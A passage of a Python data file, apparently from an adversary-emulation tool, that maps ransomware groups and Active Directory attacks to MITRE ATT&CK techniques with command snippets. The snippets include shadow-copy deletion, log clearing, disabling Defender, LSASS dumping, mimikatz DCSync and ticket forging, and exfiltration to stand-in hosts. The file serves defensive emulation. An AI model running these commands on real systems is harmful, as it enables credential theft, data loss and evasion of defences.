                "commandSnippet": "# ProxyShell exploitation simulation",
                "scriptPath": "scenarios/alphv/proxyshell_sim.ps1"
            },
            {
                "id": "T1059.001",
                "technique": "PowerShell",
                "tactic": "Execution",
                "description": "Uses PowerShell to delete shadow copies and clear logs.",
                "commandSnippet": "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject",
                "scriptPath": "scenarios/alphv/ps_execution.ps1"
            },
            {
                "id": "T1053",
                "technique": "Scheduled Task/Job",
                "tactic": "Execution",
                "description": "Creates scheduled tasks to deploy ransomware via GPO.",
                "commandSnippet": 'schtasks /create /sc once /tn "Update" /tr "C:\\payload.exe" /st 00:00',
                "scriptPath": "scenarios/alphv/schtask_create.ps1",
                "revertScriptPath": "scenarios/alphv/schtask_create_revert.ps1"
            }
        ]
    },
    {
        "id": "avoslocker",
        "name": "AvosLocker",
        "aliases": ["Avos", "AvosLocker RaaS"],
        "description": "RaaS known for exploiting public-facing applications and using legitimate remote access tools.",
        "ttps": [
            {
                "id": "T1190",
                "technique": "Exploit Public-Facing Application",
                "tactic": "Initial Access",
                "description": "Exploits vulnerable web applications for entry.",
                "commandSnippet": "# Web exploit simulation",
                "scriptPath": "scenarios/avoslocker/webexploit_sim.ps1"
            },
            {
                "id": "T1490",
                "technique": "Inhibit System Recovery",
                "tactic": "Impact",
                "description": "Deletes shadow copies to prevent recovery.",
                "commandSnippet": "vssadmin delete shadows /all /quiet",
                "scriptPath": "scenarios/avoslocker/delete_shadows.ps1"
            },
            {
                "id": "T1219",
                "technique": "Remote Access Tools",
                "tactic": "Command and Control",
                "description": "Uses tools like AnyDesk or TeamViewer for persistence.",
                "commandSnippet": 'Start-Process "C:\\AnyDesk\\AnyDesk.exe" -ArgumentList "--start-service"',
                "scriptPath": "scenarios/avoslocker/rat_install.ps1",
                "inputParams": [{
                    "name": "C2URL",
                    "label": "C2 Server URL",
                    "type": "url",
                    "placeholder": "http://10.0.0.1:443/beacon",
                    "required": True
                }]
            },
            {
                "id": "T1486",
                "technique": "Data Encrypted for Impact",
                "tactic": "Impact",
                "description": "Encrypts victim data to demand ransom.",
                "commandSnippet": "# Encryption simulation (safe mode)",
                "scriptPath": "scenarios/avoslocker/encrypt_sim.ps1"
            }
        ]
    },
    {
        "id": "bianlian",
        "name": "BianLian",
        "aliases": ["BianLian Gang"],
        "description": "Go-based ransomware known for sandbox evasion and spreading via removable media.",
        "ttps": [
            {
                "id": "T1497",
                "technique": "Virtualization/Sandbox Evasion",
                "tactic": "Defense Evasion",
                "description": "Detects and avoids virtualization environments.",
                "commandSnippet": "Get-WmiObject Win32_ComputerSystem | Select-Object Manufacturer",
                "scriptPath": "scenarios/bianlian/vm_detect.ps1"
            },
            {
                "id": "T1027.002",
                "technique": "Software Packing",
                "tactic": "Defense Evasion",
                "description": "Uses software packing to conceal code.",
                "commandSnippet": "# Packed payload simulation",
                "scriptPath": "scenarios/bianlian/packed_payload.ps1"
            },
            {
                "id": "T1091",
                "technique": "Replication Through Removable Media",
                "tactic": "Lateral Movement",
                "description": "Spreads via USB and autorun.",
                "commandSnippet": 'Get-WmiObject Win32_LogicalDisk -Filter "DriveType=2"',
                "scriptPath": "scenarios/bianlian/usb_spread.ps1"
            },
            {
                "id": "T1486",
                "technique": "Data Encrypted for Impact",
                "tactic": "Impact",
                "description": "Encrypts data for extortion.",
                "commandSnippet": "# Encryption simulation (safe mode)",
                "scriptPath": "scenarios/bianlian/encrypt_sim.ps1",
                "revertScriptPath": "scenarios/bianlian/encrypt_sim_revert.ps1"
            }
        ]
    },
    {
        "id": "clop",
        "name": "Cl0p",
        "aliases": ["Cl0p", "TA505", "FIN11"],
        "description": "Notorious for exploiting zero-days (MOVEit, Accellion FTA) and large-scale data theft.",
        "ttps": [
            {
                "id": "T1190",
                "technique": "Exploit Public-Facing Application",
                "tactic": "Initial Access",
                "description": "Exploits CVEs like MOVEit (CVE-2023-34362).",
                "commandSnippet": "# MOVEit exploit simulation",
                "scriptPath": "scenarios/clop/moveit_exploit.ps1"
            },
            {
                "id": "T1547",
                "technique": "Boot or Logon Autostart Execution",
                "tactic": "Persistence",
                "description": "Creates registry run entries for persistence.",
                "commandSnippet": 'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Update" -Value "C:\\payload.exe"',
                "scriptPath": "scenarios/clop/registry_persist.ps1",
                "revertScriptPath": "scenarios/clop/registry_persist_revert.ps1"
            },
            {
                "id": "T1070.001",
                "technique": "Clear Windows Event Logs",
                "tactic": "Defense Evasion",
                "description": "Clears event logs to hide activity.",
                "commandSnippet": "wevtutil cl Security; wevtutil cl System",
                "scriptPath": "scenarios/clop/log_clear.ps1"
            },
            {
                "id": "T1567",
                "technique": "Exfiltration Over Web Service",
                "tactic": "Exfiltration",
                "description": "Exfiltrates data via DEWMODE webshell.",
                "commandSnippet": "# Webshell exfil simulation",
                "scriptPath": "scenarios/clop/webshell_exfil.ps1"
            }
        ]
    },
    {
        "id": "conti",
        "name": "Conti",
        "aliases": ["Conti Team", "Wizard Spider"],
        "description": "Major RaaS operation until 2022. Known for fast encryption and double extortion.",
        "ttps": [
            {
                "id": "T1486",
                "technique": "Data Encrypted for Impact",
                "tactic": "Impact",
                "description": "Fast, multi-threaded file encryption.",
                "commandSnippet": "# Fast encryption simulation",
                "scriptPath": "scenarios/conti/encrypt_sim.ps1"
            },
            {
                "id": "T1567",
                "technique": "Exfiltration Over Web Service",
                "tactic": "Exfiltration",
                "description": "Exfiltrates data before encryption for double extortion.",
                "commandSnippet": 'Invoke-WebRequest -Uri "https://c2.exfil.io/upload" -Method POST',
                "scriptPath": "scenarios/conti/exfil_web.ps1",
                "inputParams": [{
                    "name": "ExfilURL",
                    "label": "Exfiltration URL",
                    "type": "url",
                    "placeholder": "http://10.0.0.1:8080/upload",
                    "required": True
                }]
            }
        ]
    },
    {
        "id": "dragonforce",
        "name": "DragonForce",
        "aliases": ["DragonForce Malaysia"],
        "description": "Hacktivist-turned-ransomware group known for self-deleting payloads.",
        "ttps": [
            {
                "id": "T1562.001",
                "technique": "Impair Defenses: Disable or Modify Tools",
                "tactic": "Defense Evasion",
                "description": "Disables Windows Defender before encryption.",
                "commandSnippet": "Set-MpPreference -DisableRealtimeMonitoring $true",
                "scriptPath": "scenarios/dragonforce/disable_defender.ps1",
                "revertScriptPath": "scenarios/dragonforce/disable_defender_revert.ps1"
            },
            {
                "id": "T1070.004",
                "technique": "Indicator Removal: File Deletion",
                "tactic": "Defense Evasion",
                "description": "Self-deletes ransomware binary after execution.",
                "commandSnippet": "Remove-Item -Path $MyInvocation.MyCommand.Path -Force",
                "scriptPath": "scenarios/dragonforce/self_delete.ps1"
            },
            {
                "id": "T1486",
                "technique": "Data Encrypted for Impact",
                "tactic": "Impact",
                "description": "Encrypts files for ransom.",
                "commandSnippet": "# Encryption simulation",
                "scriptPath": "scenarios/dragonforce/encrypt_sim.ps1"
            }
        ]
    },
    {
        "id": "safepay",
        "name": "SafePay",
        "aliases": ["SafePay Ransomware"],
        "description": "RaaS gaining access via RDP and using UAC bypass via CMSTPLUA COM object.",
        "ttps": [
            {
                "id": "T1133",
                "technique": "External Remote Services",
                "tactic": "Initial Access",
                "description": "Gains access via exposed RDP services.",
                "commandSnippet": "Test-NetConnection -ComputerName <TARGET> -Port 3389",
                "scriptPath": "scenarios/safepay/rdp_scan.ps1",
                "inputParams": [{
                    "name": "TargetIP",
                    "label": "Target IP or Subnet",
                    "type": "subnet",
                    "placeholder": "10.0.0.0/24",
                    "required": True
                }]
            },
            {
                "id": "T1548.002",
                "technique": "Abuse Elevation Control Mechanism: Bypass UAC",
                "tactic": "Privilege Escalation",
                "description": "Bypasses UAC using CMSTPLUA COM object.",
                "commandSnippet": "# UAC bypass via CMSTPLUA simulation",
                "scriptPath": "scenarios/safepay/uac_bypass.ps1",
                "revertScriptPath": "scenarios/safepay/uac_bypass_revert.ps1"
            },
            {
                "id": "T1003",
                "technique": "Credential Dumping",
                "tactic": "Credential Access",
                "description": "Harvests credentials for lateral movement.",
                "commandSnippet": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump (Get-Process lsass).Id C:\\temp\\lsass.dmp full",
                "scriptPath": "scenarios/safepay/cred_dump.ps1"
            },
            {
                "id": "T1048",
                "technique": "Exfiltration Over Alternative Protocol",
                "tactic": "Exfiltration",
                "description": "Uses FTP (FileZilla) for data exfiltration.",
                "commandSnippet": "ftp -s:script.txt ftp.exfil.io",
                "scriptPath": "scenarios/safepay/ftp_exfil.ps1",
                "inputParams": [{
                    "name": "FTPServer",
                    "label": "FTP Server IP",
                    "type": "ip",
                    "placeholder": "10.0.0.1",
                    "required": True
                }]
            }
        ]
    },
    {
        "id": "identity-attacks",
        "name": "Identity Attacks (AD/Kerberos)",
        "aliases": ["Kerberos Abuse", "AD Attacks", "Impacket"],
        "description": "Active Directory identity-based attacks targeting Kerberos authentication, credential replication, and ticket forging for domain compromise.",
        "ttps": [
            {
                "id": "T1003.006",
                "technique": "OS Credential Dumping: DCSync",
                "tactic": "Credential Access",
                "description": "Replicates password data from the DC using Directory Replication Service.",
                "commandSnippet": 'mimikatz.exe "lsadump::dcsync /user:krbtgt" "exit"',
                "scriptPath": "scenarios/identity_attacks/dcsync.ps1"
            },
            {
                "id": "T1558.003",
                "technique": "Kerberoasting",
                "tactic": "Credential Access",
                "description": "Requests TGS tickets for SPN accounts for offline cracking.",
                "commandSnippet": "New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN",
                "scriptPath": "scenarios/identity_attacks/kerberoast.ps1"
            },
            {
                "id": "T1558.004",
                "technique": "AS-REP Roasting",
                "tactic": "Credential Access",
                "description": "Targets accounts without Kerberos preauthentication.",
                "commandSnippet": "Rubeus.exe asreproast /format:hashcat",
                "scriptPath": "scenarios/identity_attacks/asrep_roast.ps1"
            },
            {
                "id": "T1558.001",
                "technique": "Golden Ticket",
                "tactic": "Credential Access",
                "description": "Forges a TGT using the krbtgt NTLM hash for unrestricted domain access.",
                "commandSnippet": 'mimikatz.exe "kerberos::golden /user:Admin /domain:YOURDOMAIN /sid:S-1-5-... /krbtgt:<HASH> /ptt"',
                "scriptPath": "scenarios/identity_attacks/golden_ticket.ps1",
                "revertScriptPath": "scenarios/identity_attacks/golden_ticket_revert.ps1",
                "inputParams": [{
                    "name": "KrbtgtHash",
                    "label": "krbtgt NTLM Hash (optional)",
                    "type": "text",
                    "placeholder": "aad3b435b51404eeaad3b435b51404ee",
                    "required": False
                }]
            },
            {
                "id": "T1558.002",
                "technique": "Silver Ticket",
                "tactic": "Credential Access",
                "description": "Forges a TGS for specific services — never contacts the KDC.",
                "commandSnippet": 'mimikatz.exe "kerberos::golden /service:cifs /target:<DC> /rc4:<HASH> /ptt"',
                "scriptPath": "scenarios/identity_attacks/silver_ticket.ps1",
                "inputParams": [{
                    "name": "ServiceHash",
                    "label": "Service Account NTLM Hash (optional)",
                    "type": "text",
                    "placeholder": "aad3b435b51404eeaad3b435b51404ee",
                    "required": False
                }]
            },
            {
                "id": "T1558.001b",
                "technique": "Diamond Ticket",
                "tactic": "Credential Access",
                "description": "Modifies a real TGT PAC — stealthier than Golden Ticket.",
                "commandSnippet": "Rubeus.exe diamond /krbkey:<KEY> /ticketuser:Admin /ticketuserid:500 /groups:512 /ptt",
                "scriptPath": "scenarios/identity_attacks/diamond_ticket.ps1",
                "inputParams": [{
                    "name": "KrbtgtHash",
                    "label": "krbtgt Hash (optional)",
                    "type": "text",
                    "placeholder": "aes256 or ntlm hash",
                    "required": False
                }]
            },
            {
                "id": "T1021.002b",
                "technique": "Impacket Remote Execution Suite",
                "tactic": "Lateral Movement",
                "description": "Impacket tools for remote execution: secretsdump, wmiexec, smbexec, psexec.",
                "commandSnippet": "secretsdump.exe DOMAIN/user@TARGET",
                "scriptPath": "scenarios/identity_attacks/impacket_exec.ps1"
            }
        ]
    }
]


def get_scenario_by_id(scenario_id):
    """Find a scenario by its ID."""
    return next((s for s in SCENARIOS if s["id"] == scenario_id), None)


def get_campaign_by_id(campaign_id):
    """Find a campaign by its ID."""
    return next((c for c in CAMPAIGNS if c["id"] == campaign_id), None)


def get_threat_actor_by_id(actor_id):
    """Find a threat actor by its ID."""
    return next((a for a in THREAT_ACTORS if a["id"] == actor_id), None)
